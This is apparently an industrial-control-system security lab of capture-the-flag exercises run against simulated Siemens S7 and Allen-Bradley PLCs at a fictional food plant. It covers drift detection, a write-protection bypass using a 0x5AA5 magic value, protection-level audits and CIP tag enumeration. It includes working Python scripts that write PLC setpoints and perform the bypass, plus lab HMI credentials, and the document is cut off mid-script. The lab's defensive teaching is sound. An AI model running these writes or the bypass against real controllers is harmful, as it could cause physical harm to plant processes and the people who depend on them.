docs.title: Background: The DB1 Tag Map
docs.text:
The Plant 2 water PLC packs all of its fast-access process variables into the first 28 bytes of DB1:

Offset Field Scaling Baseline 0-1 pH_pv value / 100 720 2-3 pH_sp value / 100 720 4-5 chlorine_pv value / 100 (ppm) 120 6-7 chlorine_sp value / 100 (ppm) 120 8-9 raw_tank_level value / 100 (%) 7800 10-11 treated_tank_level value / 100 (%) 6200 12-13 flow_gpm raw 240 14-15 turbidity value / 100 (NTU) 85 16-17 caustic_pump_rate ml/min 45 18-19 caustic_pump_actual ml/min 45 20-21 chlorine_pump_rate ml/min 22 22-23 chlorine_pump_actual ml/min 22 24-25 plant_state enum 1 (running) 26-27 alarm_word bitfield 0

The four process variables at offsets 0, 4, 8, 10, 12, 14 have natural noise from the simulator (about 1 to 2 raw counts per second). Real drift shows up as a monotonic change well outside that noise band.

docs.title: Tools You Will Need
docs.text: Tool Purpose python-snap7 S7comm client struct Unpack the 14 uint16 values

docs.title: Stage 1: Baseline Read
docs.text:
DB1 packs 14 consecutive uint16 values into its first 28 bytes. Each value is 2 bytes big-endian. The format string ">14H" tells struct.unpack to decode 14 unsigned 16-bit integers in big-endian order, which corresponds to all 14 tags in the DB1 tag map above.

The labels array maps each decoded value to its human-readable name in the same order the tags sit in DB1. The zip(labels, tags) call pairs each name with its value for the printout.

Kali

python3 - <<'PYEOF'
import struct
from snap7.client import Client
c = Client()
c.connect("plc-water.masa.local", 0, 1, tcpport=102)
raw = bytes(c.db_read(1, 0, 28))
tags = struct.unpack(">14H", raw)
labels = ["pH_pv","pH_sp","cl_pv","cl_sp","raw_lvl","tr_lvl",
          "flow","turb","cau_sp","cau_act","cl_sp_ml","cl_act_ml",
          "state","alarm"]
for name, val in zip(labels, tags):
    print(f"{name:10s} = {val}")
c.disconnect()
c.destroy()
PYEOF

Record the values in your engagement log. You will compare them against a second read shortly.

docs.title: Stage 2: Second Read and Diff
docs.text:
The detection technique is simple: take two reads with a time gap and compute the delta for each tag. Natural simulator noise moves most tags by 1 to 5 counts per second. A tag drifting at the attacker's rate will move 20 or more counts in a 12-second window, which is impossible to explain as noise.

The script below takes both reads in the same connection so the gap is exactly time.sleep(12) seconds. For each tag it computes vb - va (second minus first) and flags anything with an absolute delta of 20 or more.

Kali

python3 - <<'PYEOF'
import struct, time
from snap7.client import Client
c = Client()
c.connect("plc-water.masa.local", 0, 1, tcpport=102)
labels = ["pH_pv","pH_sp","cl_pv","cl_sp","raw_lvl","tr_lvl",
          "flow","turb","cau_sp","cau_act","cl_sp_ml","cl_act_ml",
          "state","alarm"]
a = struct.unpack(">14H", bytes(c.db_read(1, 0, 28)))
time.sleep(12)
b = struct.unpack(">14H", bytes(c.db_read(1, 0, 28)))
for name, va, vb in zip(labels, a, b):
    mark = " <-- DRIFT" if abs(vb - va) >= 20 else ""
    print(f"{name:10s} {va:6d} -> {vb:6d} (delta {vb-va:+d}){mark}")
c.disconnect()
c.destroy()
PYEOF
Expected pattern 

pH_pv       720 ->    721 (delta +1)
pH_sp       720 ->    720 (delta +0)
cl_pv       142 ->    178 (delta +36)
cl_sp       205 ->    265 (delta +60) <-- DRIFT
...
The exact numbers will differ depending on when you connected. The signal is that cl_sp is climbing by ~5 counts per second, which is orders of magnitude beyond any natural noise.

docs.title: Stage 3: Correct the Drift
docs.text:
Now that you know cl_sp (DB1 offset 6) is the drifting tag, write the safe baseline (1.20 ppm = raw 120) back to that offset. The PLC only accepts the correction as evidence of detection after the drift has climbed past 1.50 ppm (raw 150). That threshold prevents a lucky guess from earning the flag without observing the drift first.

The script below checks the current chlorine_sp before writing. If the value is still below 150, the drift has not accumulated enough, and the script waits 15 more seconds before retrying. After the corrective write, read DB400 to retrieve the reward block.

Kali

python3 - <<'PYEOF'
import struct, time
from snap7.client import Client
c = Client()
c.connect("plc-water.masa.local", 0, 1, tcpport=102)
cur = struct.unpack(">H", bytes(c.db_read(1, 6, 2)))[0]
print(f"chlorine_sp before correction: {cur}")
if cur < 150:
    print("drift not yet accumulated; sleeping 15 s and retrying")
    time.sleep(15)
    cur = struct.unpack(">H", bytes(c.db_read(1, 6, 2)))[0]
    print(f"chlorine_sp after wait:        {cur}")
c.db_write(1, 6, struct.pack(">H", 120))
time.sleep(2)
reward = bytes(c.db_read(400, 0, 48)).rstrip(b"\x00").decode("ascii")
print(f"DB400 reward: {reward}")
c.disconnect()
c.destroy()
PYEOF

Submit the decoded DB400 string as the flag.

A drift left uncorrected does not stay quiet forever. Once the chlorine setpoint climbs past the dosing safety limit, the same independent safety system from Exercise 4.3 trips the plant, and the cockpit you watched sit calmly in band finally drops to alarm. The whole value of the diff workflow is catching the drift in the quiet phase, well before the screen ever looks like the figure below.

The eventual trip: when an uncorrected drift finally pushes the setpoint past the safety limit, the dosing pump isolates, the safety banner fires, and the cockpit drops to alarm. By the time the operator sees this screen the cumulative overdose has already happened, which is why drift has to be caught in the quiet phase.

docs.title: Output Interpretation
docs.text:
• A diff of fewer than 5 counts on most tags is natural simulator noise. Anything past 20 counts in a 12-second window is real drift
  • The drifting tag is always at the same offset. In this simulator the planted drift is on chlorine_sp at DB1 offset 6
  • DB400 reads as DRIFT_NOT_CORRECTED until you submit a correction while the drift is above 1.50 ppm. A premature correction leaves DB400 stuck
  • The simulator does not stop the drift after you correct it. If you watch DB1 offset 6 after the correction, you will see it climb again. That is intentional; real drift attacks do not stop just because a defender made one write

docs.title: Analysis Questions
docs.text:
1. Why is a diff of two reads fundamentally more powerful than a single point-in-time read, even for a well-instrumented PLC?

Reveal answer

A single read tells you the state of the system at one instant. A diff of two reads tells you the rate of change, which is usually the more interesting quantity for an attack. Rate-of-change signals catch drift attacks, stuck sensors, runaway PID loops, write amplification loops, and rogue commissioning scripts, all of which look innocuous in a single read. The professional habit is to always take two reads and ask "is anything moving?"

2. The drift in this simulator is 3 ppm/min. Would a production attacker ever use a rate that fast?

Reveal answer

No. A production attacker would use a rate slow enough that it hides inside the natural variability of the process over a week or a month. Something like 0.1 ppm per day is realistic. The 3 ppm/min rate in the simulator is a training-speed compression so you can observe the effect inside a lab session. The detection technique is the same; only the sample interval changes. For a 0.1 ppm/day drift you would take daily reads from a historian and diff weeks.

3. Why does the simulator require the drift to climb above 1.50 ppm before accepting a correction?

Reveal answer

Training design. If the correction worked from any starting state, a student who guessed right could submit the correction on their first write without observing the drift at all. The 1.50 ppm threshold forces the student to take two reads, see the drift, and wait for it to accumulate. That is the professional habit the exercise is teaching.

4. If Plant 2 deployed a historian-based trend alarm on chlorine_sp, would it catch this attack?

Reveal answer

Yes, if the alarm is configured right. A trend alarm that fires on "setpoint changed by more than 0.05 ppm in 24 hours without a work order ticket" would catch every drift attack of this kind. The two configuration gotchas are (1) the alarm must be on the setpoint, not the process variable, because the PV is expected to move with operations, and (2) the alarm must integrate over a time window long enough to not fire on routine setpoint tuning. Getting those two choices right is hard, which is why Reyna has been fighting for the historian upgrade.

docs.title: Key Takeaways
docs.text:
• Take two reads. Always. The rate of change is the signal, not the value
  • Threshold alarms are blind to drift attacks by design. Trend alarms catch them, but only when the thresholds and windows are tuned with care
  • The same diff approach that detects drift attacks also catches stuck sensors, runaway PID loops, and rogue commissioning scripts. Learn it once, use it everywhere
  • Correcting the setpoint once is not the whole defense. You also need to find the source of the writes, or the drift will resume

docs.title: Scenario
docs.text:
Siemens S7 PLCs expose a multi-tier protection level scheme. Level 1 is no protection. Level 2 is write-protected: reads succeed without authentication, writes are silently discarded by the firmware unless the client has presented a legacy password. Level 3 adds read protection, and level 4 is fully locked.

In 2018, Siemens disclosed a legacy-service-code weakness on S7-300 and S7-400 family controllers where a well-known "unlock magic" value written to a specific datablock offset would clear the level 2 write-protection flag without presenting any credential. Masa Foods' Plant 2 PLC was commissioned on an old firmware baseline that still honors that legacy code.

Reyna Alvarado wants this documented in the Plant 2 risk register so the next firmware upgrade cycle gets prioritized. Your job is to demonstrate the bypass end to end against the simulator copy of the Plant 2 PLC.

docs.title: Why this matters
docs.text:
Protection level 2 is the compromise most Masa Foods Plant 2 PLCs are running on right now. Operations loves it because reads still work, which means the morning quality review and the HMI dashboards keep functioning. Security leadership points at it as "write-protected" and sleeps well at night. Reyna wants to break the "sleeps well at night" assumption with a two-line demonstration. If you can unlock the PLC with a hardcoded magic value from a 2018 service bulletin, then protection level 2 is not write-protected. It is write-protected against non-trivial adversaries, and OT threat actors are not non-trivial adversaries.

Exercise 4.5 also teaches you that "defense in depth" is not a slogan. Protection level 2 is one layer, and it falls to a known-bad magic. You need network segmentation, write logging, and protection level 3 on the PLCs that matter. Exercise 4.5 is the worked example for Reyna's capital request.

Level Reads Writes Notes 1 Free Free Default. Most un-commissioned PLCs ship at level 1 2 Free Require legacy password Silent drop on unauthenticated write 3 Require password Require password "HMI access" mode. Engineering tools must authenticate 4 Require password Require password Full lock, no anonymous communication

Level 2 is the most common setting on brownfield Plant 2 deployments because operations demands unimpeded reads. The legacy password mechanism in level 2 is a shared secret configured in TIA Portal and checked by the PLC firmware on every write. The 2018 advisory disclosed that a well-known magic value written to a specific datablock offset would set the internal "authorized" flag on older firmware, effectively bypassing the password check. Masa's Plant 2 firmware was never upgraded past that baseline.

The simulator models the bypass with a single check: if any client writes 0x5AA5 to DB500 offset 0 on a PLC running at protection level 2, the "locked" flag clears on the next tick and all subsequent writes to DB1 persist as if protection level 1 were in effect.

docs.title: Tools You Will Need
docs.text: Tool Purpose python-snap7 S7comm client struct Pack the unlock magic and test setpoints

docs.title: Stage 1: Prove the PLC is Write-Protected
docs.text:
The detection technique for level 2 protection is a write-then-read test. Write a safe value (60 ml/min is well below the SIS trip threshold), wait 2 seconds for the PLC's sync loop to run, then read the same offset back. If the read returns the original value instead of 60, the PLC silently discarded your write, which is exactly what protection level 2 does. If the read returns 60, the write persisted and the PLC is at level 1.

The 2-second sleep is important because the PLC's sync loop runs once per second. Reading immediately after writing might catch the buffer before the firmware has had a chance to revert it.

Kali

python3 - <<'PYEOF'
import struct, time
from snap7.client import Client
c = Client()
c.connect("plc-water.masa.local", 0, 1, tcpport=102)
before = struct.unpack(">H", bytes(c.db_read(1, 16, 2)))[0]
print(f"before: {before} ml/min")
c.db_write(1, 16, struct.pack(">H", 60))
time.sleep(2)
after = struct.unpack(">H", bytes(c.db_read(1, 16, 2)))[0]
print(f"after write of 60: {after} ml/min")
if after == before:
    print("write was silently dropped => level 2 confirmed")
else:
    print("write persisted => level 1, not level 2")
c.disconnect()
c.destroy()
PYEOF
Expected output 
before: 45 ml/min
after write of 60: 45 ml/min
write was silently dropped => level 2 confirmed

The wire-level write to DB1 offset 16 succeeded at the S7comm layer (no exception was raised), but the simulator's protection logic reverted the value on the next sync. That is exactly how real level 2 protection behaves on the 2018-vintage firmware baseline: the PDU returns OK and the value is silently discarded.

docs.title: Stage 2: Write the Legacy Unlock Magic
docs.text:
Kali

python3 - <<'PYEOF'
import struct, time
from snap7.client import Client
c = Client()
c.connect("plc-water.masa.local", 0, 1, tcpport=102)
c.db_write(500, 0, struct.pack(">H", 0x5AA5))
print("wrote 0x5AA5 to DB500 offset 0")
time.sleep(2)
c.disconnect()
c.destroy()
PYEOF

The PLC checks DB500 offset 0 once per simulator tick (one second), so give it at least 2 seconds before your next write.

docs.title: Stage 3: Confirm the Unlock
docs.text:
Repeat the write-and-read test from Stage 1. The value should now persist.

python3 - <<'PYEOF'
import struct, time
from snap7.client import Client
c = Client()
c.connect("plc-water.masa.local", 0, 1, tcpport=102)
c.db_write(1, 16, struct.pack(">H", 60))
time.sleep(2)
after = struct.unpack(">H", bytes(c.db_read(1, 16, 2)))[0]
print(f"after write of 60: {after} ml/min")
if after == 60:
    print("unlock succeeded, write persisted")
else:
    print("unlock failed")
c.disconnect()
c.destroy()
PYEOF

docs.text:
Kali

from snap7.client import Client
c = Client()
c.connect("plc-water.masa.local", 0, 1, tcpport=102)
raw = bytes(c.db_read(400, 0, 48))
text = raw.rstrip(b"\x00").decode("ascii")
print(f"DB400: {text}")
c.disconnect()
c.destroy()
PYEOF

Submit the decoded string as the flag.

docs.text:
Kali

python3 - <<'PYEOF'
import struct
from snap7.client import Client
c = Client()
c.connect("plc-water.masa.local", 0, 1, tcpport=102)
c.db_write(1, 16, struct.pack(">H", 45))
print("restored caustic setpoint to 45 ml/min")
c.disconnect()
c.destroy()
PYEOF

docs.title: Output Interpretation
docs.text:
• A successful wire-level write that does not persist is the classic signature of Siemens level 2 protection. The S7comm layer returns OK even though the firmware discarded the payload
  • DB400 reads as LOCKED_READ_REQUIRES_UNLOCK before the unlock and flips to the flag string after. You can read DB400 at any time to check current lock state
  • The unlock is sticky for the lifetime of the simulator container. Once you write the magic, the PLC stays unlocked until it restarts
  • The bypass only works against protection level 2. A PLC at protection level 4 silently discards the unlock magic, which is what Exercise 4.6 exploits

docs.title: Analysis Questions
docs.text:
1. Why does a successful S7comm write return OK on the wire even when the PLC firmware discards the payload?

Reveal answer

The S7comm protocol layer on a Siemens PLC has no concept of authorization. The firmware protection check sits above the protocol layer. When a level 2 PLC receives a write PDU, the S7comm stack parses the PDU, acknowledges receipt, and hands the write to the firmware. The firmware then applies its own authorization rules and decides whether to persist the value. From the wire, the write looks fully successful because the S7comm ACK came back OK. The split between protocol and authorization is the reason "wire-level write success" does not imply "persisted".

2. What is the difference between "silent drop" (level 2) and "rejected with error" (level 4)?

Reveal answer

Silent drop means the write PDU is acknowledged but the underlying value is not updated. The client has no protocol-level signal that anything went wrong and must discover the drop by reading the value back. Rejected with error means the write PDU returns an S7comm error code and the client knows immediately that the write did not take. Silent drop is worse for attackers because their tools will happily report "write succeeded" and they will not know until they verify the read. It is better for defenders for the same reason: attackers make more noise trying to verify.

3. Why does Masa Foods have a 2018-era firmware baseline on Plant 2?

Reveal answer

Three reasons in roughly every plant: (1) firmware upgrades on Siemens controllers require a maintenance window because the CPU has to be power-cycled, (2) operations treats PLCs as "do not touch" infrastructure, and (3) the security team does not have budget to insist. The combination means brownfield Siemens PLCs run on whatever firmware shipped at commissioning until something major forces the upgrade. The Exercise 4.5 demonstration is Reyna's lever to force the upgrade.

4. If Masa enabled protection level 3, would it block the 0x5AA5 bypass?

Reveal answer

Yes. Protection level 3 requires read authentication in addition to write authentication, so the S7comm session never reaches the point where the firmware inspects DB500 in the first place. The magic value is never read and never checked. The tradeoff is that operations reads also need a credential, which breaks HMI deployments that rely on unauthenticated reads. Moving from level 2 to level 3 is the hardest protection level change in a brownfield Siemens deployment.

docs.title: Defensive Recommendations to Masa
docs.text: Finding Risk Mitigation Plant 2 PLCs running at protection level 2 with 2018-vintage firmware Critical Upgrade firmware to the current baseline during the next maintenance window and move to protection level 3 No S7 write logging on the Plant 2 segment High Deploy an S7-aware Zeek sensor on the Plant 2 VLAN and log all write PDUs with source IP and DB number Protection level 2 treated as "write-protected" in the risk register High Update the risk register to classify level 2 as "protected against casual misuse only, not adversaries"

docs.title: Key Takeaways
docs.text:
• Protection level 2 is not write-protected. It is write-protected against casual misuse
  • Silent drop is worse for attackers than explicit rejection because it costs them nothing to try, but it is also a gift for defenders because verification attempts make noise
  • The 0x5AA5 bypass is a 2018 public disclosure. Every brownfield Siemens deployment should have been audited for firmware baseline in 2019. Masa Foods never did the audit
  • Network segmentation and write logging are complementary to protection level. Defense in depth is the only real answer

docs.text:
Masa Foods Plant 2 runs three Siemens S7-1214C controllers. Commissioning records were lost in the 2024 SharePoint migration and nobody is certain which controllers are hardened and which are still shipping from the vendor default. Reyna Alvarado wants a documented audit that states the protection level of each PLC so the next firmware maintenance window can prioritize the unhardened units first.

You have S7comm network access to all three PLCs:

  • plc-water-a.masa.local (PLC A)
  • plc-water-b.masa.local (PLC B)
  • plc-water-c.masa.local (PLC C)

docs.title: Why this matters
docs.text:
Exercise 4.6 is the bread and butter of an OT security engineer's job on a brownfield fleet. Every real plant has lost commissioning documentation at some point, every real plant has PLCs commissioned by different engineers on different days with different protection choices, and every real plant's risk register contains at least one line that says "unknown protection level, assumed level 1 pending audit". The audit is the job, and there is no shortcut past it.

The professional habit Exercise 4.6 builds is writing a single probe script once, parameterizing it on the target IP, and running it against every PLC on the network. Reyna uses the same technique when she walks new Plant 2 acquisitions. You are building the muscle to repeat the audit for the next 50 PLCs Masa acquires.

docs.title: The audit decision tree
docs.text:
Observation Conclusion Test write persists immediately Level 1 (no protection) Test write reverts, then persists after 0x5AA5 unlock Level 2 (write-protected, legacy unlock accepted) Test write reverts even after 0x5AA5 unlock Level 4 (full lock)

Your job is to run the probe against all three PLCs and assemble the audit fingerprint in this format:

OCR{s7_audit_a<lvl>_b<lvl>_c<lvl>}

Where each <lvl> is 1, 2, or 4. For example, substituting the level you read for each PLC into its slot gives OCR{s7_audit_a<lvlA>_b<lvlB>_c<lvlC>}.

docs.title: Background: Why Level 4 Also Rejects the Unlock Magic
docs.text:
Exercise 4.5 showed you that writing 0x5AA5 to DB500 offset 0 bypasses protection level 2 on the simulator PLC. Level 4 is different. Siemens protection level 4 is a full lock: the firmware does not inspect DB500 at all when the current protection level is 4, because DB500 is itself inside the protected memory space. From the attacker's point of view, a level 4 PLC looks identical to a level 2 PLC that already has the unlock magic installed and a bug in the service code check. The only way to distinguish them is to write a test setpoint after the unlock attempt. If the write persists, it was level 2. If the write still reverts, it was level 4.

There is no known wire-level bypass for Siemens protection level 4 on current firmware. Brownfield PLCs running a 2018-vintage baseline may have other disclosed bugs, but 0x5AA5 is not one of them against level 4.

docs.title: Tools You Will Need
docs.text: Tool Purpose python-snap7 S7comm client struct Pack setpoints and unlock magic A parameterized probe script Reusable audit primitive

docs.title: Stage 1: Probe a Single PLC by Hand
docs.text:
Before writing any automation, walk the decision tree from the background section against one PLC manually. PLC A is a good starting point. The sequence you need is the same three-step test you used in Exercise 4.5:

  1. Read the current caustic setpoint from DB1 offset 16 (your "before" value)
  2. Write a safe test value (60 ml/min) and read it back
  3. If the write reverted, attempt the 0x5AA5 unlock and try the write again

Kali

python3 - <<'PYEOF'
import struct, time
from snap7.client import Client
c = Client()
c.connect("plc-water-a.masa.local", 0, 1, tcpport=102)

before = struct.unpack(">H", bytes(c.db_read(1, 16, 2)))[0]
print(f"baseline: {before} ml/min")

c.db_write(1, 16, struct.pack(">H", 60))
time.sleep(2)
after = struct.unpack(">H", bytes(c.db_read(1, 16, 2)))[0]
print(f"after write: {after} ml/min")

if after == 60:
    print("=> write persisted, this is level 1")
    c.db_write(1, 16, struct.pack(">H", 45))
else:
    print("=> write reverted, trying 0x5AA5 unlock")
    c.db_write(500, 0, struct.pack(">H", 0x5AA5))
    time.sleep(2)
    c.db_write(1, 16, struct.pack(">H", 60))
    time.sleep(2)
    after2 = struct.unpack(">H", bytes(c.db_read(1, 16, 2)))[0]
    print(f"after unlock + write: {after2} ml/min")
    if after2 == 60:
        print("=> unlock worked, this is level 2")
    else:
        print("=> unlock had no effect, this is level 4")
    c.db_write(1, 16, struct.pack(">H", 45))

c.disconnect()
c.destroy()
PYEOF

Run the same block against PLC B and PLC C by changing the hostname. Notice that the logic is identical each time, only the target changes. That repetition is the signal that the code should become a function.

docs.title: Stage 2: Parameterize into a Reusable Script
docs.text:
Extract the probe logic into a function that takes a hostname and returns the protection level as a string. Save this as audit.py:

Kali: audit.py

import struct, sys, time
from snap7.client import Client

def probe(host):
    """Run the three-step decision tree against one PLC.
    Returns '1', '2', or '4'."""
    c = Client()
    c.connect(host, 0, 1, tcpport=102)

    # Step 1: write a safe test value and read it back
    c.db_write(1, 16, struct.pack(">H", 60))
    time.sleep(2)
    after1 = struct.unpack(">H", bytes(c.db_read(1, 16, 2)))[0]
    if after1 == 60:
        c.db_write(1, 16, struct.pack(">H", 45))
        c.disconnect(); c.destroy()
        return "1"

    # Step 2: write reverted, so try the legacy unlock
    c.db_write(500, 0, struct.pack(">H", 0x5AA5))
    time.sleep(2)

    # Step 3: retry the same write after unlock
    c.db_write(1, 16, struct.pack(">H", 60))
    time.sleep(2)
    after2 = struct.unpack(">H", bytes(c.db_read(1, 16, 2)))[0]
    c.db_write(1, 16, struct.pack(">H", 45))
    c.disconnect(); c.destroy()

    if after2 == 60:
        return "2"
    return "4"

for host in sys.argv[1:]:
    print(f"{host}: level {probe(host)}")

The function follows the exact same decision tree you ran by hand in Stage 1. Step 1 distinguishes level 1 from everything else. Steps 2 and 3 distinguish level 2 from level 4. The sys.argv loop at the bottom lets you pass all three hostnames on one command line.

docs.title: Stage 3: Run Against All Three PLCs
docs.text:
Kali

python3 audit.py plc-water-a.masa.local plc-water-b.masa.local plc-water-c.masa.local
Expected output 
plc-water-a.masa.local: level 1
plc-water-b.masa.local: level 2
plc-water-c.masa.local: level 4

The exact mapping depends on how the simulator container was spawned. Do not memorize the mapping; trust the probe output.

docs.title: Stage 3: Assemble the Audit Fingerprint
docs.text: From the example output, read each PLC's level and substitute it into the template, producing OCR{s7_audit_a<lvlA>_b<lvlB>_c<lvlC>}. The actual values depend on the levels your probe reports, so derive them from your own audit rather than copying any worked example.

docs.title: Stage 4: Engagement Log
docs.text:
Record the audit in your engagement log as a professional habit. The format Reyna expects is:

PLC Hostname Protection Level Firmware Baseline Recommendation A plc-water-a.masa.local from probe from DB100 from decision tree B plc-water-b.masa.local from probe from DB100 C plc-water-c.masa.local from probe from DB100

The firmware baseline comes from reading DB100 offset 0-64 on each PLC (the same device identification read you practiced in Exercise 4.1). In this simulator all three report the same S7-1214C order code, but a real audit would catch mixed hardware.

docs.title: Output Interpretation
docs.text:
• A level 1 PLC is the worst result because it means the PLC has no protection at all and any attacker on the OT LAN can write to DB1 unimpeded
  • A level 2 PLC that yields to the 0x5AA5 bypass is nearly as bad because the bypass is public and has been on every S7 pentest cheatsheet since 2018
  • A level 4 PLC is the only acceptable audit result for a production Plant 2 unit. Anything else goes on the risk register with a remediation deadline
  • A probe that hangs on connect() means the target is not reachable at all. Check TCP/102 and name resolution before assuming the PLC is level 4 by default

docs.title: Analysis Questions
docs.text:
1. Why is the parameterized probe script the right primitive, even though you only run it three times in this exercise?

Reveal answer

Real audit jobs scale to 20 or 200 PLCs. Writing a parameterized script once and running it against a list is orders of magnitude faster than three copy-paste Python blocks, and it also leaves behind an artifact you can check into version control, share with the team, and re-run next quarter. The professional habit is to never write a single-shot audit. Always parameterize.

2. Your probe writes 60 ml/min to DB1 offset 16 and restores it to 45. Is that ever unsafe?

Reveal answer

In this simulator, no. 60 ml/min is well below the 120 ml/min SIS trip threshold and the PLC will dose at 60 for about 2 seconds before you restore it. In a real plant the answer depends on the plant's safety envelope and whether 60 ml/min is inside the authorized operating band for the current batch. For a real audit, always confirm the safe probe value with the plant engineer before writing. The safe default is to read only and declare level 1 and level 2 indistinguishable, which is worse than nothing.

3. If PLC A and PLC B are physically identical but report different protection levels, what does that tell you about Plant 2's commissioning discipline?

Reveal answer

It tells you that commissioning was done by at least two different engineers, or the same engineer on two different days with two different project templates. Neither is unusual in brownfield plants. The audit finding is not "someone messed up"; it is "the commissioning process is not standardized and should be". The fix is a commissioning checklist that enforces a single protection level as the default and flags exceptions explicitly.

4. Would a Modbus-aware IDS catch the audit probe?

Reveal answer

No, for two reasons. First, a Modbus IDS does not inspect S7comm packets, so it cannot see DB1 writes at all. Second, even an S7-aware IDS tuned to catch malicious writes would see this probe as three normal DB writes from a single source and might or might not fire depending on the source IP reputation. The point is that audit activity and attack activity look identical at the protocol layer, which is why audit work should always be coordinated with the SOC and logged in the change control system before you start.

docs.text:

  • Level 4 is the only acceptable steady state for a production Plant 2 controller. Levels 1 and 2 both go on the risk register
  • Audit and attack look identical on the wire. Coordinate every audit with the SOC and change control in advance
  • Brownfield commissioning is always inconsistent. Plan for the inconsistency instead of pretending it does not exist

docs.text: Plant 3 in Laredo runs the finished-product packaging line. An Allen-Bradley ControlLogix 1756-L83E manages the conveyor, labeler, and palletizer. docs.title: Why this matters
docs.text:
CIP (Common Industrial Protocol) is the application layer that rides on top of EtherNet/IP (TCP/44818). Where Modbus addresses data by register number and S7comm addresses data by datablock number and offset, CIP addresses tags by name. A tag called ConveyorSpeed is read by asking for ConveyorSpeed, not for register 40001 or DB1 offset 4. Name-based addressing means the PLC exposes its own data dictionary. An attacker who can reach TCP/44818 can enumerate every tag name, learn the process variables, and read or write them without needing any documentation. Exercise 5.1 exists to make you fluent in that workflow so you understand the risk before you start testing Plant 3's defenses.

Credentials in scope Username Password Where it is used Plant 3 HMI (reference) plant_op masa_op_2025 Not used in this exercise

Operator HMI access is listed for reference only. Exercise 5.1 touches the PLC directly over CIP and does not log in anywhere.

docs.title: The operator cockpit
docs.text:
Plant 3 runs a live operator cockpit for the carton packaging line. Open it in a browser at the address shown for ophmi-packaging in the Exercise Network panel (HTTP, port 80); from the in-lab Kali the name ophmi-packaging.masa.local also resolves. The cockpit animates the conveyor, labeler, box accumulator, and palletizer in real time and carries a live CIP traffic ticker, so every tag you read over EtherNet/IP shows up on the same screen the floor supervisor watches.

Normal operation: the line runs at its conveyor setpoint, boxes accumulate toward the 24-per-pallet target, and the gauges for conveyor speed, label rate, and pallet rate sit in band. Every number on this screen is one of the nine CIP tags you are about to enumerate.

Flip the cockpit into its Engineering view and every element is labelled with the live CIP tag behind it, so the conveyor block reads ConveyorSpeed and the palletizer reads PalletCount straight off the HMI. The same symbol table you are about to pull with get_tag_list() is one click away on the operator console.

The Engineering X-ray binds each cockpit element to the live CIP tag that drives it and exposes the full packaging-line tag map as a register table. Reading `ConveyorSpeed`, `BoxCount`, and `PalletCount` over the wire returns the exact values shown here.

docs.title: Background: What CIP and EtherNet/IP Are
docs.text:
EtherNet/IP is the industrial Ethernet standard maintained by ODVA. The protocol stack layers as follows:

Layer Purpose TCP/44818 Transport (explicit messaging) EtherNet/IP encapsulation Session registration, send/receive data framing CIP (Common Industrial Protocol) Application layer: tag reads, tag writes, device identity

docs.title: Tag-based addressing
docs.text:
Modbus uses numeric register addresses (40001, 30001). S7comm uses datablock numbers and byte offsets (DB10, offset 0, length 32). CIP uses symbolic tag names. The PLC maintains an internal symbol table that maps each tag name to a memory address, a data type, and access permissions. The pycomm3 method get_tag_list() retrieves that entire symbol table in one call.

The same name-based addressing that makes enumeration easy also makes manipulation easy. An unauthenticated CIP write to a control tag such as LineState flips the packaging line to a fault state in a single request. Exercise 5.1 only reads, but the cockpit makes the stakes visible: the screen below is the same line after one unauthorized write.

One unauthenticated CIP write to `LineState` drops the cockpit to LINE FAULT and halts production. Reading tags by name is harmless; writing them by name without authentication is the risk this level is built to expose.

docs.title: CIP data types
docs.text:
CIP Type Constant Size Python equivalent INT 0x00C3 2 bytes signed 16-bit integer DINT 0x00C4 4 bytes signed 32-bit integer STRING 0x00DA variable ASCII string with length prefix

Allen-Bradley PLCs also support BOOL, REAL, and user-defined types. The Plant 3 packaging PLC uses only INT, DINT, and STRING.

docs.title: pycomm3 LogixDriver
docs.text:
pycomm3 provides LogixDriver, a high-level client that handles session registration, Forward Open connection setup, and CIP message framing. The key methods are:

  • get_tag_list(): enumerate every tag name, type, and instance ID
  • read(tag_name): read a single tag and return its value
  • write(tag_name, value): write a value to a tag

docs.title: Tools You Will Need
docs.text: Tool Purpose pycomm3 CIP/EtherNet/IP client library for Allen-Bradley PLCs nc (netcat) Verify TCP/44818 reachability Wireshark Optional capture to inspect EtherNet/IP framing

docs.title: Stage 1: Verify the Stack
docs.text:
Confirm that pycomm3 is importable, the hostname resolves, and the CIP port is open before you begin.

Kali

python3 -c "from pycomm3 import LogixDriver; print('pycomm3 ok')"
getent hosts plc-packaging.masa.local
nc -zv plc-packaging.masa.local 44818

All three must succeed before you continue.

docs.title: Stage 2: Enumerate Tags
docs.text:
Open a Python script that connects to the PLC and retrieves the full tag list. The LogixDriver constructor takes the target hostname or IP. Setting init_tags=False prevents the driver from automatically reading every tag during connection setup, giving you explicit control over what happens on the wire. After connecting, call get_tag_list() to retrieve the symbol table. Each entry contains the tag name, the CIP type code, and the instance ID.

Kali

python3 - <<'PYEOF'
from pycomm3 import LogixDriver

with LogixDriver("plc-packaging.masa.local", init_tags=False) as plc:
    tags = plc.get_tag_list()
    print(f"Found {len(tags)} tags:\n")
    for t in tags:
        print(f"  {t.tag_name:<20s}  type=0x{t.type_info.data_type:04X}")
PYEOF
Expected output 
Found 9 tags:

  ConveyorSpeed         type=0x00C3
  ConveyorSetpoint      type=0x00C3
  BoxCount              type=0x00C4
  LabelerState          type=0x00C3
  PalletCount           type=0x00C4
  LineState             type=0x00C3
  ProductCode           type=0x00C4
  SerialNumber          type=0x00DA
  FlagBlock             type=0x00DA

Nine tags total. Note how each tag name is human-readable. An attacker on the OT LAN now knows every process variable on the packaging line without needing any engineering documentation.

docs.title: Stage 3: Read Every Tag
docs.text:
Now read all nine tags to see their current values. Loop over the tag list and call read() on each one. The read() method returns a Tag object whose .value attribute holds the decoded Python value.

Kali

python3 - <<'PYEOF'
from pycomm3 import LogixDriver

with LogixDriver("plc-packaging.masa.local", init_tags=False) as plc:
    tags = plc.get_tag_list()
    print(f"{'Tag':<20s}  {'Value'}")
    print("-" * 50)
    for t in tags:
        result = plc.read(t.tag_name)
        print(f"  {t.tag_name:<20s}  {result.value}")
PYEOF
Expected output 
Tag                   Value
--------------------------------------------------
  ConveyorSpeed         64
  ConveyorSetpoint      65
  BoxCount              127
  LabelerState          1
  PalletCount           5
  LineState             1
  ProductCode           44210
  SerialNumber          MASA3001
  FlagBlock             OCR{...}

The exact numeric values for ConveyorSpeed, BoxCount, and PalletCount will differ because the PLC simulation is live. The FlagBlock value is your flag.

docs.title: Stage 4: Read the Flag Directly
docs.text:
For a clean read that you can copy and submit, read only the FlagBlock tag. A direct single-tag read is also the pattern you would use in a real engagement to minimize wire traffic.

Kali

python3 - <<'PYEOF'
from pycomm3 import LogixDriver

